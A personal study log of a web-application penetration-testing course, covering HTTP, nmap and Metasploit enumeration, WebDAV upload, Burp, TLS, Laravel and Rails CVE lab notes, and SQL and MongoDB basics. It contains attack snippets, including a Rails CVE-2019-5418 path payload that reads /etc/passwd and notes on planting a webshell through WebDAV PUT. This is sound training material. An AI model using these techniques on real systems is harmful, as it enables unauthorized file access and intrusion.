*disclaimer: if anyone else is **actually** reading this. take note that i have absolutely no clue on the specifics behind the legality of some of these attempts. just don't do stuff on websites that aren't yours or you don't have permission to pentest.*

this markdown file is to be used in conjunction with the slides and is supposed to track my self learning...[hardlinked!]

- [Day1: Introduction](#day1-introduction)
  - [HTTP as a stateless protocol](#http-as-a-stateless-protocol)
    - [netcat / curl / wireshark for http requests](#netcat--curl--wireshark-for-http-requests)
  - [wireshark: network sniffer, to sniff at a per-packet level](#wireshark-network-sniffer-to-sniff-at-a-per-packet-level)
    - [more on cookies](#more-on-cookies)
  - [http status codes](#http-status-codes)
  - [http request methods](#http-request-methods)
  - [lab2 HTTP method enumeration](#lab2-http-method-enumeration)
    - [my steps overall:](#my-steps-overall)
    - [using nmap and [the official nmap guide](https://nmap.org/book/man.html)](#using-nmap-and-the-official-nmap-guide)
    - [dirb: a web content scanner](#dirb-a-web-content-scanner)
      - [curl and wget and [another comparison](https://unix.stackexchange.com/questions/47434/what-is-the-difference-between-curl-and-wget)](#curl-and-wget-and-another-comparison)
      - [WebDAV](#webdav)
    - [foxyproxy proxy plugin for browser](#foxyproxy-proxy-plugin-for-browser)
    - [burp](#burp)
    - [DNS and how domain name resolution works works](#dns-and-how-domain-name-resolution-works-works)
    - [Internet Protocol Suite](#internet-protocol-suite)
      - [tcp 3-way handshake](#tcp-3-way-handshake)
      - [Network Sockets](#network-sockets)
      - [http vs https and [why http is not secure](https://www.cloudflare.com/learning/ssl/why-is-http-not-secure/) and [more on http/3 with QUIC protocol](https://medium.com/devgorilla/what-is-http-3-94335c57823f)](#http-vs-https-and-why-http-is-not-secure-and-more-on-http3-with-quic-protocol)
  - [week 1 Lab: laravel unserialize](#week-1-lab-laravel-unserialize)
  - [week 1 Lab: rails doubletap RCE](#week-1-lab-rails-doubletap-rce)
- [Day 2: databases in webapps](#day-2-databases-in-webapps)
  - [week 2 lab: SQL basics](#week-2-lab-sql-basics)
  - [week 2 lab: NoSQL basics:](#week-2-lab-nosql-basics)
  - [week 2 lab: mysql recon basics](#week-2-lab-mysql-recon-basics)
  - [week2: mongodb recon basics](#week2-mongodb-recon-basics)
  - [wee2: from web to shell on the server](#wee2-from-web-to-shell-on-the-server)
- [Day 3: directory enumeration and the various tools for it](#day-3-directory-enumeration-and-the-various-tools-for-it)
  - [more on crawling](#more-on-crawling)
    - [week 3 lab: dirb directory enum](#week-3-lab-dirb-directory-enum)
  - [week3 lab: dirbuster directory enum](#week3-lab-dirbuster-directory-enum)
  - [week 3 lab: burpsuite directory enum](#week-3-lab-burpsuite-directory-enum)
  - [week 3 lab: gobuster](#week-3-lab-gobuster)
    - [week 3 lab: opendoor](#week-3-lab-opendoor)
    - [week3 lab: zaproxy](#week3-lab-zaproxy)
      - [directory enum with zaproxy](#directory-enum-with-zaproxy)
      - [active crawling with zaproxy](#active-crawling-with-zaproxy)
  - [webapp scanning](#webapp-scanning)
    - [week3: webapp scanning with nikto](#week3-webapp-scanning-with-nikto)
    - [week 3: webapp scanning using zaproxy](#week-3-webapp-scanning-using-zaproxy)
  - [xss attacking and sql injections](#xss-attacking-and-sql-injections)
    - [week 3: using xsser for xss attacks](#week-3-using-xsser-for-xss-attacks)
    - [week 3: using sqlmap](#week-3-using-sqlmap)
- [day 4: authentication, cracking passwords and code injections](#day-4-authentication-cracking-passwords-and-code-injections)
  - [Authentication in HTTP](#authentication-in-http)
    - [Week 3 Labs: Hydra and HTTP auth](#week-3-labs-hydra-and-http-auth)
    - [Week 3: using hydra to attack form login](#week-3-using-hydra-to-attack-form-login)
    - [week 3: using zapproxy to attack form logins](#week-3-using-zapproxy-to-attack-form-logins)
    - [week 4: burpsuite login form attack](#week-4-burpsuite-login-form-attack)
  - [OWASP (open web application security project) top 10](#owasp-open-web-application-security-project-top-10)
    - [Injection Attacks](#injection-attacks)
      - [Week4 lab: OS command injection, blind and non-blind (3 labs underthis)](#week4-lab-os-command-injection-blind-and-non-blind-3-labs-underthis)
        - [reverse shell vs bind shell](#reverse-shell-vs-bind-shell)
        - [tool: netcat](#tool-netcat)
      - [week 4 lab: bind vs reverse shell](#week-4-lab-bind-vs-reverse-shell)
    - [XSS](#xss)
- [day 5: OWASP top10: Injections, Broken Auth, Improper Sessions Management & Sensitive Data Exposure](#day-5-owasp-top10-injections-broken-auth-improper-sessions-management--sensitive-data-exposure)
  - [A1: Injection Attacks](#a1-injection-attacks)
    - [week5 lab: SQLi bypassing auth, Free Article Submission](#week5-lab-sqli-bypassing-auth-free-article-submission)
    - [week5 lab: SQL Injection -CVE: OpenSupports](#week5-lab-sql-injection--cve-opensupports)
    - [week 5 lab: SQL Injection](#week-5-lab-sql-injection)
  - [A2: broken auth](#a2-broken-auth)
    - [week5: Broken Auth - Airline Booking – Update cookie](#week5-broken-auth---airline-booking--update-cookie)
    - [Week 5 lab: Improper Session Management – Manipulate URL parameter](#week-5-lab-improper-session-management--manipulate-url-parameter)
  - [A3: sensitive data exposure](#a3-sensitive-data-exposure)
    - [week5: SQL information available from Web Server Logs, real world webapp](#week5-sql-information-available-from-web-server-logs-real-world-webapp)
    - [week5: Sensitive Directories in `robots.txt`](#week5-sensitive-directories-in-robotstxt)
- [Day 6: OWASP top 10: XXE, Broken Access Control,](#day-6-owasp-top-10-xxe-broken-access-control)
  - [A4 XXE: XML external entity injection](#a4-xxe-xml-external-entity-injection)
    - [Week 6 lab: XXE Injection](#week-6-lab-xxe-injection)
    - [Week 6 lab: XML External Entity – alter DTD, XSS attack with XSSer](#week-6-lab-xml-external-entity--alter-dtd-xss-attack-with-xsser)
    - [week6 lab: XML External Entity – CVE: Apache Solr  -alter xml file](#week6-lab-xml-external-entity--cve-apache-solr--alter-xml-file)
    - [week 6 lab: XML External Entity – CVE: Apache Solr](#week-6-lab-xml-external-entity--cve-apache-solr)
  - [A5 Broken Acess Control](#a5-broken-acess-control)
    - [week 6 lab: Insecure Object Direct Reference – Horizontal and Vertical Escalation](#week-6-lab-insecure-object-direct-reference--horizontal-and-vertical-escalation)
    - [week 6 lab: Insecure Object Direct Reference II – Changing ticket price](#week-6-lab-insecure-object-direct-reference-ii--changing-ticket-price)
- [current lab list](#current-lab-list)
    - [week6 lab: Local file inclusion – change filename](#week6-lab-local-file-inclusion--change-filename)
    - [week6 lab: Local file inclusion & Directory traversal - bloofoxCMS](#week6-lab-local-file-inclusion--directory-traversal---bloofoxcms)
    - [week6 lab: Local file inclusion & Directory traversal - bloofoxCMS](#week6-lab-local-file-inclusion--directory-traversal---bloofoxcms-1)
    - [week6 lab: Directory Traversal](#week6-lab-directory-traversal)
- [day 7: Broken Access Control, Security Misconfiguration](#day-7-broken-access-control-security-misconfiguration)
    - [week 7 lab: Remote File Inclusion I](#week-7-lab-remote-file-inclusion-i)
    - [week 7 lab: Remote File Inclusion II PHP Shell](#week-7-lab-remote-file-inclusion-ii-php-shell)
  - [A6: Security Misconfiguration](#a6-security-misconfiguration)
    - [week7 lab: Missing Function-Level Access Control: Arbitrary Folder Deletion](#week7-lab-missing-function-level-access-control-arbitrary-folder-deletion)
    - [week7 lab: Vulnerable Apache Sever- Lack of Access Control on POST](#week7-lab-vulnerable-apache-sever--lack-of-access-control-on-post)
    - [week7 lab: WED-DAV – Missing Access control on upload method](#week7-lab-wed-dav--missing-access-control-on-upload-method)
  - [A7: Cross-Site Scripting: XSS](#a7-cross-site-scripting-xss)
    - [week 7 lab: Article Setup – reflected XSS](#week-7-lab-article-setup--reflected-xss)
    - [week 7 lab: APHP Micro Blog – Persistent XSS, negative example of reflected XSS](#week-7-lab-aphp-micro-blog--persistent-xss-negative-example-of-reflected-xss)
    - [week7 lab: RCE Via MySQL](#week7-lab-rce-via-mysql)
- [Day 8: Insecure Deserialisation, Using Compromised Components and Insufficient Logging & Monitoring](#day-8-insecure-deserialisation-using-compromised-components-and-insufficient-logging--monitoring)
  - [insecure deserialisation](#insecure-deserialisation)
    - [week 8 lab: Pickeld Deserialiser II -Change serialized cookie with different value](#week-8-lab-pickeld-deserialiser-ii--change-serialized-cookie-with-different-value)
    - [week8 lab: Pickeld Deserialiser I - Change serialized object to reverse shell object](#week8-lab-pickeld-deserialiser-i---change-serialized-object-to-reverse-shell-object)
  - [Using Vulnerable Components](#using-vulnerable-components)
    - [week8 lab: Vulnerable Xdebug](#week8-lab-vulnerable-xdebug)
    - [week 8 lab: Vulnerable to shellshock](#week-8-lab-vulnerable-to-shellshock)
  - [Insufficient Logging](#insufficient-logging)
    - [week 8 lab: Log Analysis for GoAccess](#week-8-lab-log-analysis-for-goaccess)
    - [week 8 lab: Log Analysis for Apache](#week-8-lab-log-analysis-for-apache)
    - [week8 lab: Privilege Escalation Web to Root](#week8-lab-privilege-escalation-web-to-root)
- [less important labs to do soon:](#less-important-labs-to-do-soon)
- [todos and toreads](#todos-and-toreads)
- [uncategorised readings:](#uncategorised-readings)
- [Useful References](#useful-references)
- [Questions:](#questions)

# Day1: Introduction 

Objectives: 
  1. beginner friendly webapp security
  2. participating in bug bounty

Resources: 
  1. pentester academy 6mth subscription

when doing labs, disable firewalls
uses websockets, handle firewalls appropriately

lab manuals can be downloaded...

look at embedded devices' webapp interfaces

webapp security and cloud security, the two high demand skills

## HTTP as a stateless protocol 

Every request needs to be self-sufficiently authenticated
first lab is on HTTP basics 

Resources served by the server, are identified by the URI/URL

HTTP 1.1 vs 1.0:
   * whether you can make multiple request for the same connection or not   
   * for 1.1 the HTTP header requires you to include the hostname

HTTP supports both TCP and UDP, typically TCP is used as the underlying protocol. A 3 way handshake for the TCP connection.

### netcat / curl / wireshark for http requests

- note in the app layer, you'll see under the HTTP dropdown field for the packet in wireshark that you can see: 
     * info about the server that's replying...
- netcat is a replacement for telnet. remember to use `connection close` to close up after you pipeline HTTP requests since the HTTP connection will exist for q long.
  can use netcat to frame your own http requests

```
  printf 'GET / HTTP/1.1\r\nHost: pentesteracademylab.appspot.com\r\n\r\nPOST / HTTP/1.1\r\nHost: pentesteracademylab.appspot.com\r\n\r\n' | nc pentesteracademylab.appspot com 80 

Please note: The newline in HTTP is CRLF (\r\n) character. The end of a request is identifyed by 2 CRLF characters (\r\n\r\n)

```


## wireshark: network sniffer, to sniff at a per-packet level 

using wireshark: a packet sniffer to monitor traffic per packet
 browser plugins are available. learn new tools, make mistakes, figure out which
 tools work best for what 

 wireshark filter for various protocols, within protocols, there's gonna be subfields too

breaks packet into frames based on protocols in the stack 

consider browser devtools having bugs, that's why using something dedicated like cli application could be better than using browsers' webtools 

the hex values in your packets: the ascii equiv when it's gibberrish, you can look at the hexvalues and see if there's something to reverse engineer for that binary protocols
can save the traffic and replay ... 


**can use tcpxtract** to extract stuff from the traffic being sniffed. Note that tcpxtract isn't on kali by default. tcpxtract seems to be the most stable...

### more on cookies

* filter by `http.set_cookie` to look at the transfer of cookies. browser cache decides what to do based on expiry date of the cookie (?). note that the http header is `set_cookie`. simply put: the cookie is sent back everytime the client henceforth makes requests to the server. a particular http packer might have multiple cookies (they are essentially name-value pairs). 

* the expires attribute is very crucial
  * if a set_cookie doesn't have an expires field, it's a sessions cookie, i.e. browser will delete the cookie once the browser is closed. 
  * only if the header has an expires field, then will the cookie persist after the browser has been closed

## http status codes

- status codes have classes

## http request methods

- it's an operation that can be run on a resource on a webserver.

- GET: info retrieval, doesn't change anything in the backend. Params are passed in URL vs POST where it's via the body...
- OPTIONS: lists all supported/allowed methods. the method may not be allowed such that we can send. this is just info disclosure, not a vulnerability.
- TRACE: just echoes back the request
- PUT and DELETE mostly disabled 

- **nb:** that trace, put, delete may not have been enabled for all servers...





## lab2 HTTP method enumeration 

mainly to find vulnerabilities in legacy servers or in misconfiged situations

misconfig e.g. in Apache .htaccess files

e.g. the admin has limited access to a particular method for a usergroup but has inadvertently allowed non-auth requirement for other http methods.

### my steps overall: 

0. find host ip and target ip using `ifconfig` or `ip addr`

1. Scanning things: 
   1. did a nmap scan via `nmap –sC –sV <target-ip>  -oA`, to check for relevant HTTP methods
      
      also, look for availble nmap scripts at `cd /usr/share/nmap/scripts` (or just check official documentation) and 
      run nmap with `nmap --script=http-methods.nse 192.X.Y.3 -n -p 80` where n skips DNS resolution and p specifies the port so that nmap doesn't take too long

      **nb:** if you run the retest argument like so: `nmap --script=http-methods.nse --script-args http-methods.retest=1 <target ip>` then if there are verbs like delete and all, it will actually send that request and DELETE things...

   2. _alternatively_, http method enumeration using metasploit: 
      1. `msfconsole` to open up the metasploit framework's console
      2. `use auxialiary/scanner/http/options` to switch to that module 
      3. `show options` to show the options present in the module
      4. `set RHOSTS <target ip>` to set the target ip addr
      5. `run`  

       ```bash
       [+] 192.50.24.3 allows GET,HEAD,OPTIONS methods
       [*] Scanned 1 of 1 hosts (100% complete)
       [*] Auxiliary module execution completed
       ```

   3. method tampering [not that useful here i think]: 
      1. for nmap: `nmap --script=http-method-tamper.nse <target>`
      2. for metasploit: 
         1. `use auxiliary/scanner/http/verb_auth_bypass`
         2. `show options` and set things accordingly...

2. ***Identifying endpoints:*** Inspecting the target website. Look around, identify endpoints e.g. login pages, other pages... 
   1. for forms see what endpoint the post request corresponds to. 
   2. use dirb to enumerate end points

    endpoints found: 
    * `/index.php` the homepage  
    * `/login.php` the login form... 
    * `/post.php` the view for the post
    *  `/uploads/`


    known login credentials, login with `​ curl -X POST 192.45.178.3/login.php -d "name=john&password=password" -v`
    notice it gives a 302 redirect


3. gaining RCE by following these steps https://www.exploit-db.com/papers/12885

- **purpose**: get some interesting insights on what end points and info is available on a server

### [using nmap](https://www.edureka.co/blog/nmap-tutorial/) and [the official nmap guide](https://nmap.org/book/man.html)

- so many flags! e.g. `nmap –sC –sV <target-ip>  -oA results.txt`

- can search for nmap scripts e.g. `cd /usr/share/nmap/scripts/`

### dirb: a web content scanner

- first thing is to check what services there are: using `dirb <ipaddr>`
   It is a _dictionary attack_ to find the present directories.
   - has a dict of ipaddrs and it will see if that dir exists for that ipaddr
    as there is no definite way to find all directories present on the server if the directory listed 
    is not allowed (which is the common case), dirb is trying different directory names from the dictionary to see if this specific one exist


    . we might look at uploads dir to see if there's some interesting stuff left available: see "google dorking" 
      where info available in the uploads dir shows up via google searches 
      look at "google site operators" 
      nb: just cuz google made it discoverable doesn't mean that it's legal to get that info

- note that ARP is more at the mac addr level

#### [curl and wget](https://daniel.haxx.se/docs/curl-vs-wget.html) and [another comparison](https://unix.stackexchange.com/questions/47434/what-is-the-difference-between-curl-and-wget)

- use `curl` to run the get request manually  the `-X GET` specifies the method get. note that `BURP` is a gui alternative to curl with added features.
- e.g. using the `OPTIONS` verb will return the... 

- you may uncover interesting endpoints that allows us to download/upload stuff 
   if a webdav `PUT` verb is available available then you can compromise the server by putting some files in.

- forms and post methods.. see use the `OPTIONS` verb to check if posting is allowed

- check the `/uploads` dir. check if `PUT` method is allowed

#### [WebDAV](https://en.wikipedia.org/wiki/WebDAV)

Allows for authoring of remote web content. Basically your crud actions 

extends the standard HTTP verbs and headers and allows some additional request methods.

*  web DAV for sharing and collabing doc over a web protocol. should be enabled w the proper authentication and authorisation...
     using highlevel software might inadvertently open up some of these vulnerabilities, making the server insecure 

* **core problem/vulnerability: insecure web DAV deployment**
  e.g. if we find that we can make `PUT` requests
- **JUST BECAUSE YOU DON'T HAVE A MEHTOD IN OPTIONS DOESN'T MEAN THAT IT DOESN'T EXISTS** there are other quirks due to certain modules allowing use of some methods...



- curl has the `--upload-file <filename>` allows you to put it on a particular /uploads endpoint

- challenge: how to get a webshell, to control this server using this DAV and /uploads vulnerability



### foxyproxy proxy plugin for browser

- you want the ability to modify/alter the data as it's passing and then see how the application response. to help you reverse engineer some bad dev/biz decisions, trying to test corner cases 

### burp

- can intercept traffix. the browser request will be paused, allowing us to see it in a frozen state.
- can do this for both directions from browser to server and vice versa 
- use this to inspect communications, consider edge cases based on the biz logic of the application e.g. to xfer money, what happens if you input a negative number? these things can't be tested via the UI, but modifying the requests via a intercepting proxy will help 
- litmus test: 
    - the app should be something you created
    - you have explicit clear permission to go ahead and audit



self signed http ssl certificate?


### [DNS and how domain name resolution works works](https://www.youtube.com/watch?v=mpQZVYPuDGU)
Resolving domain names to IP addrs e.g. yahoo.com to the actual ip addr of that server 
The DNS server has a db that it cross refers to for the name resolution. 
If local cache can't help to resolve names then it passes it on to the **Resolver Server** , and if that fails to resolve 
the names, will be passed to the **Root server**. 
13 sets of root servers exist, handled by 12 different organisations. 

Root server gives the **TLD server** (stores addr info for the tlds) addr to the Resolver server which finally asks the TLD server for the ipaddr for the 
address of the tld (e.g. yahoo.com(?)). 
TLD server will give the addr for that name, which the resolver server uses to look for **Authoritative Name Servers**
ANS knowns everything about the domain (e.g. ip addr)
Note that the resolver server will cache this query for future similar queries.



### [Internet Protocol Suite](https://en.wikipedia.org/wiki/Internet_protocol_suite)
The Internet protocol suite provides end-to-end data communication specifying how data should be packetized, addressed, transmitted, routed, and received.   

4 layers of abstraction and all the relevant protocols related to these layers.

Intended to be for wired networks. Packet loss is considered to be  the result of network congestion.


#### [tcp 3-way handshake](https://madpackets.com/2018/04/10/tcp_handshake/)

TCP favours reliability over timeliness. Trades latency for reliability. IP handles the actual delivery of the data
while TCP keeps track of segments.

3 way handshake happens before the actual sending of data between client and server. 

first the client send a SYN as in to synchronize

then the server will acknowledge and say SYN-ACK 

then the client will acknowledge that and say ACK 

now they ready to send HTTP requests to and fro


**nb:** ssl/tls handshake happens after the tcp handshake. TCP is for the transport layer and TLS handshake is for the application data.

#### [Network Sockets](https://en.wikipedia.org/wiki/Network_socket)

Internal Endpoint for sending/receiving data within a node on a computer network.
Socket addr is combination of the ip addr and the socket being used.







#### [http vs https](https://seopressor.com/blog/http-vs-https/) and [why http is not secure](https://www.cloudflare.com/learning/ssl/why-is-http-not-secure/) and [more on http/3 with QUIC protocol](https://medium.com/devgorilla/what-is-http-3-94335c57823f)

the S is for Secure. done by having an extra SSL/TLS encryption layer. SSL (Secure Sockets Layer) Certificate needs to be there, creating an encrypted connection between
the server and the browser.

Also secured via a [TLS protocol](https://www.cloudflare.com/learning/ssl/transport-layer-security-tls/) (Transport Layer Security).  Prevents transfer of data being modified, corrupted; provides user authentication(?)
TLS vs SSL: 
  * SSL is the predecessor to TLS but the names are pretty interchangeable

TLS handshake happens for the application data. A **cypher suite** is involved. The TLS handshake also handles authentication (where the server proves its identity to the client)

**public keys:** encryption keys with one-way encryption, so anyone can unscramble the data encrypted with a private key to ensure its authenticity...
Data encrypted with the public key can only be decrypted with the private key, and vice versa.

TLS affects load times a little bit. Countering technologies: TLS False Start (already start transmitting data while the handshake is underway) and TLS Session Resumption (use an abbreviated handshake if connection b/w server and client has happened before)

Thanks to google, switching to HTTPS will improve SEO so this incentivises the switch.
Need to use HTTPS if you wanna have Accelerated Mobile Pages (AMP) means to be mobile friendly, better to use HTTPS  


***SSL Certificates***: certificate is a data file hosted in a website's origin server, contain the website's public key and the identity of the website w other related information.
what the certificate contains: 
        The domain name that the certificate was issued for
        Which person, organization, or device it was issued to
        Which certificate authority issued it
        The certificate authority's digital signature
        Associated subdomains
        Issue date of the certificate
        Expiration date of the certificate
        The public key (the private key is kept secret)

[more on CDN's and Origin Servers here #todo this reading](https://www.cloudflare.com/learning/cdn/glossary/origin-server/)

SSL Certs help prevent [spoofing #todo reading](https://www.cloudflare.com/learning/ddos/glossary/ip-spoofing/)  and such attacks
nmap tutorial: https://www.edureka.co/blog/nmap-tutorial/


SSL certs are given by a Certificate Authority, an outside org. So what's a **self-signed SSL certificate**? can be created by generating a public-private key pairing and having all the info of a cert. Self-signed because it's from a website's own private key. 
Ppl do this because getting issued an SSL cert requires money (like a license) Cloudfare gives free SSL certs 







## week 1 Lab: laravel unserialize

Aim: use the [CVE-2018-15133](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133) exploit for the laravel framework.

0. understanding the exploit by reading the [laravel documentation on the exploit](https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30):
      - when the APP_KEY (an encryption key?) env variable is with a malicious party. If an attacker has the APP_KEY, they can create malicious payload and encrypt it with the APP_KEY Sending the encrypted payload in the X-XSRF-TOKEN token will result in deserialization, which during processing will result in Remote Code execution.
1. recon the target: 
    * we know that the port 8000 (for tcp/udp connections?) is left open and we have a known mac address for the target IP.
    * info about the webapp framework being used, do a curl request on that open port 
      QQ: the lab guide says that we do a curl request and then know that the framework being used is laravel because of the title of the html doc, but there shouldn't be any link b/w the title of the webapp and the framework used, right? instead, we should maybe look at the verbose output for that curl comd, which says that the cookie set is a laravel_session..



## week 1 Lab: rails doubletap RCE 

Aim: two vulnerabilities to the Rails framework are known, we have to exploit those 

0. understanding the exploits by reading the mitre links, which have advisory pages from other sites about the vulnerability
   - CVE-2019-5418: According to the [Google Group discussion](https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q), A specifically crafted header can result in arbitrary file read. 
   - see the [blog post](https://chybeta.github.io/2019/03/16/Analysis-for【CVE-2019-5418】File-Content-Disclosure-on-Rails/) to understand how the exploit works. something like :
      `/etc/passwd{{},}{+{},}{.{raw,erb,html,builder,ruby,coffee,jbuilder},}` will make the  /etc/passwd will be treated the template to be rended ，which lead to a arbitrary file read attack.

1. network scan on target ip to find open ports and see what services are running...
    - nmap tells us that the port 3000 is open and running it w -sC and -sV tells us that the webapp runs on Rails
    - we can do a curl command on the target ip and get the version of rails that is being run. here it's Rails 5.2.1, 
    - next we look for relevant end points using dirb, we see that `/test` is worth looking into

2. now for the other vulnerability CVE-2019-5420
   - we can bruteforce the Key used to encrypt the session since it depends on the name of the application. 
   - with the key we sent a serialized payload to the endpoint, which when decrypted and deserialized will give RCE

  for this just use the relevant metasploit script...



***takeaways:***

1. exploits can be composited together!


webapp vs website: https://www.guru99.com/difference-web-application-website.html

using telnet to send http request?? aren't they diff protocols though  https://www.the-art-of-web.com/system/telnet-http11/

more on IP addrs and subnets, representation in CIDR(classless inter domain routing) https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing


- nmap's mongodb-brute script uses a default dictionary (it's a hybrid of )


[google dorking and db hacking](https://securitytrails.com/blog/google-hacking-techniques)

- webcrawling by search engines done by bots. there's a protocol that dictates that all robots need to look at the [robots.txt file](https://www.seobility.net/en/wiki/Robots.txt?utm_source=google&utm_medium=cpc&utm_campaign=wiki_en&utm_term={robots%20txt}&utm_content=lp_robots.txt&gclid=EAIaIQobChMIu4uIhdi_6QIVmh0rCh3yBgZCEAAYASAAEgLXSvD_BwE) before doing anything else this file restricts what can be crawled.
- whoa this is really cool 


[what a webshell is](https://malware.expert/general/what-is-a-web-shell/)

- written based on what lang/framework is used for the website. acts as a backdoor.
- allows attacker to do CRUD actions on the website
- ways of getting infected: by open documents/file upload endpoints, XSS and exposed admin interfaces
  

[portknocking](https://wiki.archlinux.org/index.php/Port_knocking)

- externally opening up ports that were originally closed by default by the firewall. 
- done by "knocking" (attempting to connect to) the correct ports in a special sequence.

[the diff interfacs when you do an ip addr](https://www.computerhope.com/unix/uifconfi.htm)
Linux command to view network interfaces on your machines
(equivalent of deprecated Linux command - ifconfig)

    • Eth0 – network interface that the system uses to access lab
    • Eth1 – network interface that the system uses to communicate with others
    • Lo - special network interface that the system uses to communicate with itself.


[single page apps](https://dzone.com/articles/what-is-a-single-page-application), [why SPAs are useful](https://huspi.com/blog-open/definitive-guide-to-spa-why-do-we-need-single-page-applications) and [more common SPA frameworks](https://hackr.io/blog/best-javascript-frameworks)

- single page apps get updated via AJAX requests or via [websockets](https://en.wikipedia.org/wiki/WebSocket)
    - Websockets is another protocol distinct from http, communication done via port 80 or 443(for secure comms)
    - AJAX:  By decoupling the data interchange layer from the presentation layer, Ajax allows web pages and, by extension, web applications, to change content dynamically without the need to reload the entire page

[monolithic/multi-tiered vs microservices applications](https://dzone.com/articles/monolithic-vs-microservice-architecture)
- the browser was the (only?) client and there were no exposed APIs.
- ***API related: SOAP vs REST api (there's also GraphQL)***: [source 1](https://smartbear.com/blog/test-and-monitor/soap-vs-rest-whats-the-difference/) and [source 2 on SOAP vs REST {much better article}](https://raygun.com/blog/soap-vs-rest-vs-json/)
    - SOAP (Simple Object Access Protocol) is more rigid and standardised. Relies exclusively on XML
        - the xml can be complex, requests might have to be built manually
        - something about WSDL (Web Services Description Language) that allows IDEs to automate the XML request creation....
        - SOAP has built in error-handling (makes it rigid too)
        - SOAP can be used over SMTP (and other transport protocols) also, not just restricted to HTTP
    - REST (Representational State Transfer): relies on simple URLs, is associated with HTTP1.1 Verbs
        - not necessarily have to use XML, can use CSV, JSON and RSS as well. The idea is to obtain the info needed in a form that's easily parsed using the language needed for the application.
    - Similarities: 
        - both work over HTTP, both have well established rules on how to exchange information
    - Differences: 
        - why SOAP: 
            - not restricted to just HTTP
            - useful in a distributed situation while REST is more direct point to point.
            - built in error handling and standardised
        - why REST: 
            - can be more efficient as can use smaller message formats
            - Fast, little processing required 
  - **NB**: JSON is language agnostic!
- so yea a good analogy is the elephant (monolithic application) vs ants (application made up of many microservices)

- [microservices example of a cinema with microservices and using docker](https://dzone.com/articles/microservices-an-example-with-docker-go-and-mongod)


[containerisation and benefits, also where Docker and Kubernetes come into the picture](https://www.forbes.com/sites/forbestechcouncil/2018/10/10/docker-and-kubernetes-furthering-the-goals-of-devops-automation/#1ccc436f6506)
  * application ends up being self-sufficient, application is packaged into self-contained bundles (bundle/container has the app, dependencies, libs and configs all bundles together) [more on containerisation basics](https://www.forbes.com/sites/forbestechcouncil/2018/05/31/what-containers-do-and-how-they-can-make-or-break-your-business/#5e7127164079)
  * containers can be physical or cloud-based.
  * they have to be made to be stateful, e.g. by relying on some underlying db 
  * Docker and kubernetes are common containerisation technologies. 
    * Docker is hardware-agnostic 
    * It’s helpful to have an orchestration layer that manages resources, scheduling, load balancing and more.
    * trend now: Docker is what helps development create containers, and Kubernetes is what operations uses to orchestrate and manage them. 

[different api gateway architectures one can use](https://microservices.io/patterns/apigateway.html)

[serverless architectures](https://www.twilio.com/docs/glossary/what-is-serverless-architecture)
- Functions as a service, you're just writing the functions, letting a third party handle the backend, with a little config for which you're responsible for

[the different serverless architectural patterns possible](https://www.serverless.com/blog/serverless-architecture-code-patterns/)
[saas-vs-paas-vs-iaas](https://www.bmc.com/blogs/saas-vs-paas-vs-iaas-whats-the-difference-and-how-to-choose/)



# Day 2: databases in webapps

## week 2 lab: SQL basics

overview: 
  * SELECT, INSERT, CREATE, UPDATE statements
  * AS, DISTINCT, WHERE ORDER BY and Limit clauses
  * LIKE, AND and OR operators
  * COUNT aggregation.

* table definitions are v useful when reading raw code for the table, but other db visualising tools are much more intuitive.
* ***viewing things and navigation***: 
    * db has properties and a db schema, each table in the db will have a table definition and that gives a good overview
    * to see all dbs in the system, `show databases;` will do that 
    * select a particular db using `use <db name> ;`
    * see tables in a db using `show tables;` 
        * wildcard queries on a table: `select * from <tableName>;`
        * query specific table columns: `seelct <colName1>,<colName2> from <tableName>;`
        * retrieve data from table via dot operators: `select * from <dbName>.<tableName>`
        * **sorting** using `select * from <dbName>.<tableName> order by <columnName>`
        * **upper bound limiting** using `limit <number>`
        * **strict limiting** using `limit <upper>,<number of rows?>` <--- i think can only use for specific row number, not exactly for ranges ??
* ***table creation***
    * ```sql
      create table new_users(
          name varchar(100),
          email varchar(100),
          id varchar(100),
          primary key(id)
      )
      ```
* ***row insertion into a table followed by subsequent updating of that table***
  * ```sql
      insert into wpdatabase.new_users values ("John", "john@email.com", "pa-01234");
      update wpdatabase.new_users set name="james" where id="pa-01234";
    ```
* ***UNION SELECT statement to combine two tables***  note that the two tables need to have equal number of columns seelcted from each table
    1. first have to check the tables: `desc from wpdatabase.wp_users` 
    2. after choosing the correct columns and col names, do a union **this doesn't make a new table i think, just presents the data as a new table**
      `select user_login,user_email from wpdatabase.wp_users union select name,email from wpdatabase.new_users;`
   
* ***JOIN*** statement to combine rows from two tables:
    * ```sql
      select
      from wpdatabase.wp_users
      JOIN wpdatabase.new_users on wpdatabase.new_users.name=wpdatabase.wp_users.user_login

      <!-- Using the join statement, display the value in user_login and user_pass field from the table wp_users and display the id from new_users table. -->
      select wpdatabase.wp_users.user_login,wpdatabase.wp_users.user_pass, wpdatabase.new_users.id
      from wpdatabase.wp_users 
      JOIN wpdatabase.new_users on wpdatabase.new_users.name=wpdatabase.wp_users.user_login

      ```

    select statement shall select all necessary columns regardless of which table
    seems like the `JOIN <first table> on <first table's last col to join at = <second table's first col to start from>>`
* using ***aliases!*** as part of your select statement
    ```sql
    select user_login as name, user_pass as password from wpdatabase.wp_users;
    ```

* identifying unique col values:
    ```sql
    select distinct(post_author) from wpdatabase.wp_posts;
    ```
* ***counting***
    ```sql
    select count(*) from wpdatabase.wp_posts;
    ```
* ***select and filter via entry value*** using **WHERE**
    ```sql
    select * from wpdatabase.wp_posts where post_status='publish';
    ```
    note: can just add conditions using `and` 
* ***setting clauses*** using **like**
    ```sql
    select * from wpdatabase.wp_posts where post_content like '%wp:paragraph%'; 
    <!-- like takes in a html string -->
    ```
## week 2 lab: NoSQL basics: 

Assuming you have access to a server that has a mongo db without any access restrictions. connect to the mongo shell via `mongo <target ip>`

* diff b/w user dbs and server's other dbs: The databases "admin","config" and "local" are used by MongoDB itself.
* list out collections of documents via `show collections` 
* identifying number of documents in the database: Query Syntax: ​`db.<collection-name>.find().count()`
* adding arguments to the `find()` method almost like a json style... e.g. `db.city.find({"state":"MA"}).count()`
* adding equality arguments as nested attributes: `db.city.find({"pop":{$gt:15000}}).count()`
* nesting things with an and operator: `db.city.find({$and:[{pop:{$gt:15000}},{"state":"IN"}]}).count()`
* or operator and multiple conditions: `db.city.find({$or:[{pop:{$lt:100}},{"state":"IN"}]}).count()`
* using regex 
* using aggregation
